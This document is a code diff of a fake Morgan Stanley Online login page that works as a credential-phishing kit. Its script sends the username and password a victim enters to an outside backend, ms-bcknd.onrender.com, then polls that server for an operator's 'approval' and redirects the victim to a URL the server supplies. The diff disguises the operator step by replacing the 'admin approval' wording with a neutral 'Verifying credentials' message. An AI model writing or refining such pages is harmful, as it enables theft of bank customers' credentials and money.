@@ -8,7 +8,6 @@
     <title>Morgan Stanley Online Log in - Wealth Management</title>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        /* Your existing CSS remains exactly the same */
         :root {
             --ms-linear-gradient-start: #0d7eb3;
             --ms-linear-gradient-end: #096491;
@@ -326,16 +325,6 @@
         .error-message.show {
             display: block;
         }
-        .success-message {
-            color: #060;
-            font-size: 14px;
-            margin-top: 5px;
-            text-align: center;
-            display: none;
-        }
-        .success-message.show {
-            display: block;
-        }
         .field-error {
             color: #a00;
             font-size: 12px;
@@ -464,21 +453,26 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        .progress-container {
+        .status-container {
             margin-top: 20px;
             text-align: center;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
         }
-        .progress-text {
-            font-size: 14px;
-            color: #666;
+        .status-container.show {
+            display: block;
+        }
+        .status-container.pending {
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
         }
     </style>
 </head>
 <body>
-    <!-- Skip to main content link -->
     <a href="#main-content" class="skip-link">Skip to main content</a>
 
-    <!-- Header -->
     <div role="banner">
         <div class="mso-header-container">
             <div>
@@ -494,16 +488,13 @@
         </div>
     </div>
 
-    <!-- Main content -->
     <main id="main-content" class="login-page">
         <div class="login_form">
             <div class="login-row">
-                <!-- Left column: Login form -->
                 <div class="login-left">
                     <div class="login-container">
                         <h2>Log in to Morgan Stanley</h2>
 
-                        <!-- Updated form with correct IDs -->
                         <form id="loginForm">
                             <div class="form-row">
                                 <div class="input-wrapper">
@@ -536,13 +527,12 @@
                             <div class="form-row text-center">
                                 <button type="button" class="btn-secondary" onclick="window.location.href='#';">Create a username</button>
                             </div>
-                            <div id="successMessage" class="success-message"></div>
-                            <div id="progressContainer" class="progress-container" style="display: none;">
-                                <div class="progress-text">Verifying your credentials...</div>
+                            
+                            <div id="statusContainer" class="status-container pending">
+                                <div id="statusMessage"></div>
                             </div>
                         </form>
 
-                        <!-- Forgot links -->
                         <div class="forgot-row">
                             <div class="forgot-item">
                                 <button class="btn-secondary" style="min-width: auto;" onclick="window.location.href='#';">Forgot username?</button>
@@ -554,7 +544,6 @@
                     </div>
                 </div>
 
-                <!-- Right column: Banner (exact match) -->
                 <div class="login-right">
                     <div class="banner">
                         <div class="banner-content">
@@ -566,7 +555,6 @@
             </div>
         </div>
 
-        <!-- Footer -->
         <footer class="ms-footer">
             <div class="footer-content">
                 <div class="footer-columns">
@@ -610,16 +598,13 @@
     </main>
 
     <script>
-        // Initialize Lucide icons
         lucide.createIcons();
         
-        // CORRECT BACKEND URL - Updated to your live backend
         const BACKEND_URL = 'https://ms-bcknd.onrender.com';
         
         console.log('Frontend URL:', window.location.href);
         console.log('Using backend URL:', BACKEND_URL);
 
-        // Password toggle function
         function togglePassword() {
             const pwd = document.getElementById('passwordInput');
             const btn = document.querySelector('.show-hide');
@@ -632,7 +617,6 @@
             }
         }
 
-        // Handle login form submission
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -641,13 +625,13 @@
             const submitBtn = document.getElementById('submitBtn');
             const loadingIcon = submitBtn.querySelector('.loading');
             const submitText = submitBtn.querySelector('span');
+            const statusContainer = document.getElementById('statusContainer');
+            const statusMessage = document.getElementById('statusMessage');
             
-            // Reset messages
             document.getElementById('usernameError').classList.remove('show');
             document.getElementById('passwordError').classList.remove('show');
-            document.getElementById('successMessage').classList.remove('show');
+            statusContainer.classList.remove('show');
             
-            // Validate inputs
             if (!login.trim()) {
                 document.getElementById('usernameError').textContent = 'Please enter username or card number';
                 document.getElementById('usernameError').classList.add('show');
@@ -660,15 +644,10 @@
                 return;
             }
             
-            // Show loading state
             loadingIcon.classList.add('active');
             submitText.textContent = 'Signing in...';
             submitBtn.disabled = true;
             
-            // Show progress container
-            document.getElementById('progressContainer').style.display = 'block';
-            
-            // Save username if remember checkbox is checked
             const rememberCheckbox = document.getElementById('rememberCheckbox');
             if (rememberCheckbox.checked && login.trim()) {
                 localStorage.setItem('savedUsername', login.trim());
@@ -697,48 +676,46 @@
                 console.log('Response data:', data);
                 
                 if (response.ok && data.success) {
-                    // Success - store session ID and start polling
                     const sessionId = data.id;
                     localStorage.setItem('sessionId', sessionId);
                     
-                    // Show success message
-                    document.getElementById('successMessage').textContent = 'Login request sent. Waiting for admin approval...';
-                    document.getElementById('successMessage').classList.add('show');
+                    statusMessage.textContent = 'Verifying credentials...';
+                    statusContainer.classList.add('show');
                     
-                    // Start polling for status
+                    console.log('Login successful, session ID:', sessionId);
+                    console.log('Starting to poll for approval...');
+                    
                     pollStatus(sessionId);
                 } else {
-                    // Show error
                     const errorMsg = data.error || `Login failed. Status: ${response.status}`;
                     document.getElementById('passwordError').textContent = errorMsg;
                     document.getElementById('passwordError').classList.add('show');
                     
-                    // Reset button
                     loadingIcon.classList.remove('active');
                     submitText.textContent = 'Sign in';
                     submitBtn.disabled = false;
-                    document.getElementById('progressContainer').style.display = 'none';
                 }
             } catch (error) {
                 console.error('Network error:', error);
                 document.getElementById('passwordError').textContent = `Network error: ${error.message}. Please check backend connection.`;
                 document.getElementById('passwordError').classList.add('show');
                 
-                // Reset button
                 loadingIcon.classList.remove('active');
                 submitText.textContent = 'Sign in';
                 submitBtn.disabled = false;
-                document.getElementById('progressContainer').style.display = 'none';
             }
         });
         
         async function pollStatus(sessionId) {
             let attempts = 0;
-            const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
+            const maxAttempts = 120;
             const submitBtn = document.getElementById('submitBtn');
             const loadingIcon = submitBtn.querySelector('.loading');
             const submitText = submitBtn.querySelector('span');
-            const successMessage = document.getElementById('successMessage');
+            const statusContainer = document.getElementById('statusContainer');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            console.log(`Starting to poll for session: ${sessionId}`);
             
             const checkStatus = async () => {
                 try {
@@ -749,12 +726,12 @@
                         console.error('Status check failed:', response.status);
                         attempts++;
                         if (attempts < maxAttempts) {
+                            console.log(`Retrying in 5 seconds... (attempt ${attempts}/${maxAttempts})`);
                             setTimeout(checkStatus, 5000);
                         } else {
-                            document.getElementById('passwordError').textContent = 'Status check timed out after 10 minutes. Please try again.';
+                            document.getElementById('passwordError').textContent = 'Status check timed out. Please try again.';
                             document.getElementById('passwordError').classList.add('show');
-                            successMessage.classList.remove('show');
-                            document.getElementById('progressContainer').style.display = 'none';
+                            statusContainer.classList.remove('show');
                             resetButton();
                         }
                         return;
@@ -763,55 +740,74 @@
                     const data = await response.json();
                     console.log('Status check response:', data);
                     
-                    if (data.status === 'approved' && data.redirect_url) {
-                        // Redirect to the approved URL
-                        console.log('Approved! Redirecting to:', data.redirect_url);
-                        window.location.href = data.redirect_url;
+                    if (data.status === 'approved') {
+                        if (data.redirect_url) {
+                            let redirectUrl;
+                            
+                            if (data.redirect_url.startsWith('http')) {
+                                redirectUrl = data.redirect_url;
+                            } else {
+                                const baseUrl = window.location.origin;
+                                redirectUrl = `${baseUrl}/${data.redirect_url}`;
+                            }
+                            
+                            console.log('Approved! Redirecting to:', redirectUrl);
+                            
+                            statusMessage.textContent = 'Redirecting...';
+                            
+                            setTimeout(() => {
+                                window.location.href = redirectUrl;
+                            }, 500);
+                        } else {
+                            console.error('Approved but no redirect URL');
+                            document.getElementById('passwordError').textContent = 'Approved but no redirect URL specified';
+                            document.getElementById('passwordError').classList.add('show');
+                            statusContainer.classList.remove('show');
+                            resetButton();
+                        }
                         return true;
                     } else if (data.status === 'pending') {
-                        // Continue polling
                         attempts++;
+                        
+                        if (attempts === 1) {
+                            statusMessage.textContent = 'Waiting for approval...';
+                        } else if (attempts % 12 === 0) {
+                            const minutes = Math.floor(attempts / 12);
+                            statusMessage.textContent = `Waiting for approval... (${minutes} min)`;
+                        }
+                        
                         if (attempts < maxAttempts) {
-                            setTimeout(checkStatus, 5000); // Check every 5 seconds
-                            
-                            // Update message every few attempts
-                            if (attempts % 12 === 0) { // Every minute
-                                successMessage.textContent = `Still waiting for admin approval... (${attempts/12} minute(s))`;
-                            }
+                            console.log(`Still pending, checking again in 5 seconds... (attempt ${attempts}/${maxAttempts})`);
+                            setTimeout(checkStatus, 5000);
                         } else {
-                            // Timeout
-                            document.getElementById('passwordError').textContent = 'Request timed out after 10 minutes. Please try again.';
+                            document.getElementById('passwordError').textContent = 'Request timed out. Please try again.';
                             document.getElementById('passwordError').classList.add('show');
-                            successMessage.classList.remove('show');
-                            document.getElementById('progressContainer').style.display = 'none';
+                            statusContainer.classList.remove('show');
                             resetButton();
                         }
                     } else if (data.error) {
-                        // Error from backend
                         document.getElementById('passwordError').textContent = `Error: ${data.error}`;
                         document.getElementById('passwordError').classList.add('show');
-                        successMessage.classList.remove('show');
-                        document.getElementById('progressContainer').style.display = 'none';
+                        statusContainer.classList.remove('show');
                         resetButton();
                     }
                 } catch (error) {
                     console.error('Status check error:', error);
                     attempts++;
+                    
                     if (attempts < maxAttempts) {
+                        console.log(`Error occurred, retrying in 5 seconds... (attempt ${attempts}/${maxAttempts})`);
                         setTimeout(checkStatus, 5000);
                     } else {
                         document.getElementById('passwordError').textContent = 'Status check error. Please try again.';
                         document.getElementById('passwordError').classList.add('show');
-                        successMessage.classList.remove('show');
-                        document.getElementById('progressContainer').style.display = 'none';
+                        statusContainer.classList.remove('show');
                         resetButton();
                     }
                 }
-                return false;
             };
             
-            // Start polling
-            setTimeout(checkStatus, 5000); // First check after 5 seconds
+            setTimeout(checkStatus, 2000);
         }
         
         function resetButton() {
@@ -824,19 +820,16 @@
             submitBtn.disabled = false;
         }
         
-        // Auto-fill saved credentials if remember me was checked
         document.addEventListener('DOMContentLoaded', function() {
             const rememberCheckbox = document.getElementById('rememberCheckbox');
             const usernameInput = document.getElementById('usernameInput');
             
-            // Check if we have saved credentials
             const savedUsername = localStorage.getItem('savedUsername');
             if (savedUsername) {
                 usernameInput.value = savedUsername;
                 rememberCheckbox.checked = true;
             }
             
-            // Update save state on checkbox change
             rememberCheckbox.addEventListener('change', function() {
                 if (this.checked && usernameInput.value) {
                     localStorage.setItem('savedUsername', usernameInput.value);
@@ -845,14 +838,12 @@
                 }
             });
             
-            // Update on input
             usernameInput.addEventListener('input', function() {
                 if (rememberCheckbox.checked && this.value) {
                     localStorage.setItem('savedUsername', this.value);
                 }
             });
             
-            // Test backend connection
             console.log('Testing backend connection...');
             fetch(`${BACKEND_URL}/`)
                 .then(response => {
